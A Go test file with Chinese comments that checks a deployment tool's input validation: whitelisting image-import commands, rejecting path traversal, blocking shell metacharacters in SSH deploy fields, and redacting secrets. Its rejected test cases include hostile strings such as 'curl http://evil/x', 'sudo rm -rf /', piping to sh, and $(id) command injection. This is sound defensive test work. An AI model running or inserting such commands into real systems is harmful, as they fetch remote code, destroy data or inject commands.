package store

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateImportCmd(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		{"空命令表示跳过导入", "", false},
		{"仅空白同样跳过", "   ", false},
		{"标准 k3s 导入", "k3s ctr images import -", false},
		{"sudo 前缀", "sudo k3s ctr images import -", false},
		{"sudo 带 flag", "sudo -n k3s ctr images import -", false},
		{"绝对路径的白名单命令", "/usr/local/bin/nerdctl image load", false},
		{"k3d 导入", "k3d image import", false},
		{"任意二进制必须被拒", "/usr/bin/touch /tmp/pwned", true},
		{"伪装成参数的任意命令", "curl http://evil/x", true},
		{"sudo 后跟非白名单", "sudo rm -rf /", true},
		{"sudo 后缺命令", "sudo", true},
		{"管道等 shell 元字符被拒", "k3s ctr images import - | sh", true},
		{"命令替换被拒", "k3s ctr images import $(whoami)", true},
		{"重定向被拒", "k3s ctr images import ->/tmp/x", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ValidateImportCmd(c.cmd)
			if c.wantErr && err == nil {
				t.Fatalf("期望拒绝 %q，但通过了", c.cmd)
			}
			if !c.wantErr && err != nil {
				t.Fatalf("期望接受 %q，但被拒: %v", c.cmd, err)
			}
		})
	}
}

func TestPathWithinRoot(t *testing.T) {
	root := t.TempDir()
	cases := []struct {
		name    string
		root    string
		path    string
		wantErr bool
	}{
		{"未配置根目录则不限制", "", "/etc/passwd", false},
		{"空路径视为未设置", root, "", false},
		{"根目录内", root, filepath.Join(root, "app", "Dockerfile"), false},
		{"根目录自身", root, root, false},
		{"用 .. 逃逸", root, filepath.Join(root, "..", "etc", "passwd"), true},
		{"完全无关的绝对路径", root, "/etc/passwd", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := pathWithinRoot(c.root, c.path)
			if c.wantErr != (err != nil) {
				t.Fatalf("pathWithinRoot(%q,%q) err=%v, wantErr=%v", c.root, c.path, err, c.wantErr)
			}
		})
	}
}

func TestProjectValidate(t *testing.T) {
	root := t.TempDir()

	if err := (Project{}).Validate(""); err == nil {
		t.Fatal("缺少 name 应当报错")
	}

	ok := Project{Name: "app", Deploy: DeploySpec{Method: "local-k3s"}}
	if err := ok.Validate(""); err != nil {
		t.Fatalf("合法项目被拒: %v", err)
	}

	badMethod := Project{Name: "app", Deploy: DeploySpec{Method: "ssh-into-prod"}}
	if err := badMethod.Validate(""); err == nil {
		t.Fatal("未知部署方式应当报错")
	}

	rce := Project{Name: "app", Deploy: DeploySpec{Method: "local-k3s", K3sImportCmd: "/usr/bin/touch /tmp/x"}}
	if err := rce.Validate(""); err == nil {
		t.Fatal("任意导入命令应当被拒")
	}

	escape := Project{
		Name:  "app",
		Build: BuildSpec{Context: "/etc", Dockerfile: "/etc/passwd"},
	}
	if err := escape.Validate(root); err == nil {
		t.Fatal("配置了 work_dir 时越界路径应当被拒")
	}
	if !strings.Contains(mustErr(escape.Validate(root)), "build.") {
		t.Fatal("错误信息应指明是哪个字段越界")
	}
}

func TestRedactedAndMergeSecrets(t *testing.T) {
	stored := Project{Name: "app"}
	stored.Build.Registry.Password = "real-secret"

	red := stored.Redacted()
	if red.Build.Registry.Password != MaskedSecret {
		t.Fatalf("密码未脱敏: %q", red.Build.Registry.Password)
	}
	if stored.Build.Registry.Password != "real-secret" {
		t.Fatal("Redacted 不应修改原对象")
	}

	// 前端拿到的是掩码，回写时必须保留原密码而不是把它擦成 "********"
	merged := red.MergeSecrets(stored)
	if merged.Build.Registry.Password != "real-secret" {
		t.Fatalf("掩码回写应保留原密码，得到 %q", merged.Build.Registry.Password)
	}

	// 空密码同样视为「不修改」
	empty := Project{Name: "app"}
	if got := empty.MergeSecrets(stored).Build.Registry.Password; got != "real-secret" {
		t.Fatalf("空密码应保留原值，得到 %q", got)
	}

	// 真正给了新密码时才覆盖
	changed := Project{Name: "app"}
	changed.Build.Registry.Password = "new-secret"
	if got := changed.MergeSecrets(stored).Build.Registry.Password; got != "new-secret" {
		t.Fatalf("新密码应生效，得到 %q", got)
	}

	// 没有密码的项目不应被塞进掩码
	if got := (Project{Name: "x"}).Redacted().Build.Registry.Password; got != "" {
		t.Fatalf("空密码不应被脱敏成掩码，得到 %q", got)
	}

	// 本地路径（ssh_key_path / kubeconfig）同样脱敏，避免暴露用户名/家目录
	stored.Deploy.SSHKeyPath = "/Users/me/.ssh/id_ed25519"
	stored.Deploy.Kubeconfig = "/Users/me/.kube/config"
	red2 := stored.Redacted()
	if red2.Deploy.SSHKeyPath != MaskedSecret {
		t.Fatalf("ssh_key_path 未脱敏: %q", red2.Deploy.SSHKeyPath)
	}
	if red2.Deploy.Kubeconfig != MaskedSecret {
		t.Fatalf("kubeconfig 未脱敏: %q", red2.Deploy.Kubeconfig)
	}
	// 掩码回写应保留原本地路径
	merged2 := red2.MergeSecrets(stored)
	if merged2.Deploy.SSHKeyPath != "/Users/me/.ssh/id_ed25519" {
		t.Fatalf("ssh_key_path 掩码回写应保留原值，得到 %q", merged2.Deploy.SSHKeyPath)
	}
	if merged2.Deploy.Kubeconfig != "/Users/me/.kube/config" {
		t.Fatalf("kubeconfig 掩码回写应保留原值，得到 %q", merged2.Deploy.Kubeconfig)
	}
	// 空路径不脱敏成掩码
	empty2 := (Project{Name: "x"}).Redacted()
	if empty2.Deploy.SSHKeyPath != "" || empty2.Deploy.Kubeconfig != "" {
		t.Fatalf("空路径不应被脱敏成掩码，得到 %q / %q", empty2.Deploy.SSHKeyPath, empty2.Deploy.Kubeconfig)
	}
}

func mustErr(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func TestValidateSSHMethod(t *testing.T) {
	// 缺 host
	if err := (Project{Name: "app", Deploy: DeploySpec{Method: "ssh"}}).Validate(""); err == nil {
		t.Fatal("ssh 缺 host 应通过校验失败")
	}
	// 合法最小配置
	ok := Project{Name: "app", Deploy: DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root"}}
	if err := ok.Validate(""); err != nil {
		t.Fatalf("合法 ssh 配置不应报错: %v", err)
	}
	// run_args 含 shell 元字符应被拒（防远端命令注入）
	badArgs := Project{Name: "app", Deploy: DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHRunArgs: "x; rm -rf /"}}
	if err := badArgs.Validate(""); err == nil {
		t.Fatal("ssh_run_args 含 shell 元字符应被拒")
	}
	// 端口非数字应被拒
	badPort := Project{Name: "app", Deploy: DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHPort: "abc"}}
	if err := badPort.Validate(""); err == nil {
		t.Fatal("ssh_port 非数字应被拒")
	}
}

// TestResolveDeploySpec 验证命名发布目标的解析优先级：
// targetName 命中则返回该目标的完整 DeploySpec；否则回退主配置 + 可选 method 覆盖。
func TestResolveDeploySpec(t *testing.T) {
	p := Project{
		Name: "app",
		Deploy: DeploySpec{Method: "kubectl-apply", Namespace: "default"},
		Targets: []DeployTarget{
			{Name: "腾讯云-prod", DeploySpec: DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root"}},
			{Name: "AWS-staging", DeploySpec: DeploySpec{Method: "helm", ReleaseName: "myapp-stg"}},
		},
	}

	// 1) 命中命名目标 → 返回该目标的 spec（不因主配置 method 被改写）
	spec, err := p.ResolveDeploySpec("腾讯云-prod", "")
	if err != nil {
		t.Fatalf("应解析到 腾讯云-prod: %v", err)
	}
	if spec.Method != "ssh" || spec.SSHHost != "1.2.3.4" {
		t.Fatalf("腾讯云-prod spec 错误: %+v", spec)
	}

	// 2) 命中另一命名目标（helm）
	spec, err = p.ResolveDeploySpec("AWS-staging", "")
	if err != nil || spec.Method != "helm" || spec.ReleaseName != "myapp-stg" {
		t.Fatalf("AWS-staging spec 错误: %+v err=%v", spec, err)
	}

	// 3) 空 targetName → 回退主配置
	spec, err = p.ResolveDeploySpec("", "")
	if err != nil || spec.Method != "kubectl-apply" || spec.Namespace != "default" {
		t.Fatalf("主配置回退错误: %+v err=%v", spec, err)
	}

	// 4) 空 targetName + method 覆盖 → 主配置 method 被覆盖
	spec, err = p.ResolveDeploySpec("", "ssh")
	if err != nil || spec.Method != "ssh" {
		t.Fatalf("method 覆盖失败: %+v err=%v", spec, err)
	}

	// 5) 不存在的 targetName → 报错（避免静默发错目标）
	if _, err := p.ResolveDeploySpec("不存在", ""); err == nil {
		t.Fatal("不存在的 targetName 应报错")
	}
}

// TestValidateSSHRejectsShellMetachars 覆盖远端命令注入的剩余向量：
// 之前的检查只拦了 |;&$`>< 和换行，漏掉了 ssh_image、以及可跳出单/双引号
// 的 " ' ( ) { } \ 与以 - 开头的容器名。
func TestValidateSSHRejectsShellMetachars(t *testing.T) {
	cases := []struct {
		name string
		spec DeploySpec
	}{
		{"ssh_image 含分号", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHImage: "app; rm -rf /"}},
		{"ssh_image 含反引号", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHImage: "app`id`"}},
		{"ssh_image 含 $()", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHImage: "app$(id)"}},
		{"ssh_container 含双引号", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHContainer: `x" && touch /tmp/p`}},
		{"ssh_container 含单引号", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHContainer: "x'id'"}},
		{"ssh_container 以 - 开头", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHContainer: "-x"}},
		{"ssh_run_args 含括号", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHRunArgs: "-p 8080:8080 $(id)"}},
		{"ssh_run_args 含反斜杠", DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHRunArgs: `-p 8080:8080 \n`}},
	}
	for _, c := range cases {
		p := Project{Name: "app", Deploy: c.spec}
		if err := p.Validate(""); err == nil {
			t.Fatalf("用例 %q 应被拒（含 shell 元字符）", c.name)
		}
	}
	// 合法：含 . _ - 的容器名与正常 image 应通过
	ok := Project{Name: "app", Deploy: DeploySpec{Method: "ssh", SSHHost: "1.2.3.4", SSHUser: "root", SSHContainer: "my-app_v1", SSHImage: "registry.example.com/app:1.2.3"}}
	if err := ok.Validate(""); err != nil {
		t.Fatalf("合法 ssh 配置不应报错: %v", err)
	}
}

// TestResolveRegistrySpec 验证 registry 凭据可从 CICD_REGISTRY_* 环境变量补全，
// 使密码不必落盘到 store.json。
func TestResolveRegistrySpec(t *testing.T) {
	t.Setenv("CICD_REGISTRY_SERVER", "https://reg.example.com")
	t.Setenv("CICD_REGISTRY_USERNAME", "ci")
	t.Setenv("CICD_REGISTRY_PASSWORD", "env-secret")
	// 项目 JSON 只存 server，user/password 走 env
	reg := ResolveRegistrySpec(RegistryAuth{Server: "https://reg.example.com"})
	if reg.Username != "ci" || reg.Password != "env-secret" {
		t.Fatalf("registry 凭据应从 env 补全，得到 user=%q pass=%q", reg.Username, reg.Password)
	}
	// 项目字段优先于 env
	reg2 := ResolveRegistrySpec(RegistryAuth{Server: "s", Username: "proj-u", Password: "proj-p"})
	if reg2.Username != "proj-u" || reg2.Password != "proj-p" {
		t.Fatalf("项目字段应优先于 env，得到 user=%q pass=%q", reg2.Username, reg2.Password)
	}
}
